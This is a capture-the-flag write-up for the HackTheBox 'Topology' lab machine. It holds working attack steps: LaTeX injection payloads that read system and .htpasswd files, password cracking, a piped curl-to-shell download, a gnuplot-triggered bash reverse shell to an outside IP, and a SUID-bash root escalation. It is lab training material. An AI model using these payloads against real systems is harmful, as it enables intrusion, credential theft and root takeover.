# HackTheBox Topology

Easy level CTF lab machine of the HackTheBox platform running Linux, containing a service with Latex Injection, password reuse, misconfiguration.

## Service Overview

The machine is assigned IP address 10.10.11.217, let's scan the ports with Nmap:

```bash
$ nmap -sT -sC -Pn -p1-65535 -oN 10.10.11.217 10.10.11.217
Nmap scan report for 10.10.11.217
Host is up (0.050s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)
|   256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)
|_  256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)
80/tcp open  http
|_http-title: Miskatonic University | Topology Group

Nmap done: 1 IP address (1 host up) scanned in 41.90 seconds
```

University web page with descriptions of projects and other contacts. There is a link to the Latex generator. Check the other domains:

```bash
$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://topology.htb --append-domain -t 20
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://topology.htb
[+] Method:          GET
[+] Threads:         20
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Found: dev.topology.htb Status: 401 [Size: 463]
Found: stats.topology.htb Status: 200 [Size: 108]
Progress: 4989 / 4990 (99.98%)
===============================================================
```

Add all domains to /etc/hosts:

```bash
$ nano /etc/hosts
10.10.11.217 topology.htb latex.topology.htb dev.topology.htb stats.topology.htb
```

dev.topology.htb is closed using Basic Auth authentication (there is a .htpasswd file in the root of the directory).
The Latex generator can be used to perform a Latex Injection attack and retrieve the /var/www/dev/.htpasswd file.
I search in google for latex [exploit](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection).

```bash
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
$\lstinputlisting{/etc/passwd}$
/home/vdaisley

Server Apache/2.4.41 (Ubuntu)


$\lstinputlisting{/etc/apache2/apache2.conf}$
$\lstinputlisting{/etc/apache2/sites-available/000-default.conf}$
ServerAdmin vdaisley@topology.htb
DocumentRoot /var/www/dev
DocumentRoot /var/www/stats
DocumentRoot /var/www/latex

$\lstinputlisting{/var/www/stats/.htpasswd}$ -
$\lstinputlisting{/var/www/latex/.htpasswd}$ -
$\lstinputlisting{/var/www/dev/.htpasswd}$
vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0
```

There you got the password hash for the user ```vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0```

Use hashid to find out the hash type:

```bash
$ hashid 
$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
Analyzing '$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO'
[+] MD5(APR) 
[+] Apache MD5
```

Let's put the hash in the hash file and run hashcat:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 512/512 AVX512BW 16x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (vdaisley)
1g 0:00:00:03 DONE (2023-09-14 17:00) 0.3246g/s 323283p/s 323283c/s 323283C/s callel..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed

or

$ hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

## SSH

Let's connect via SSH.

```bash
$ ssh vdaisley@10.10.11.217
calculus20
vdaisley@topology:~$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
vdaisley@topology:~$ ls
user.txt
vdaisley@topology:~$ cat user.txt
13791a4e6fe2bf091354a1529a281545
```

## Privilege escalation

```bash
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
$ bash linpeas.sh

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/home/vdaisley
/opt/gnuplot
```

Run gnuplot as root for all files/opt/gnuplot/*.plt and put the next content into file ```$ nano 1.txt```:

```bash
system "whoami"
# Reverse shell
system "bash -c 'bash -i >& /dev/tcp/10.10.16.27/4444 0>&1'"
```

```bash
$ cat 1.txt > /opt/gnuplot/test.plt
```

Run netcat, wait a few minutes and get the root shell:

```bash
$ nc -lnvp 4444
listening on [any] 4444 ...
id
id
connect to [10.10.16.27] from (UNKNOWN) [10.10.11.217] 43166
bash: cannot set terminal process group (43177): Inappropriate ioctl for device
bash: no job control in this shell
root@topology:~# id
uid=0(root) gid=0(root) groups=0(root)
root@topology:~# id
uid=0(root) gid=0(root) groups=0(root)
root@topology:~# ls
ls
root.txt
root@topology:~# cat root.txt
cat root.txt
034c7c4e5729c84904cb583cb9d07db5
root@topology:~#
```

or 

```bash
$ echo "system 'chmod u+s /bin/bash'" > /opt/gnuplot/exploit.plt
# wait a few minutes
$ /bin/bash -p
bash-5.0# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)
```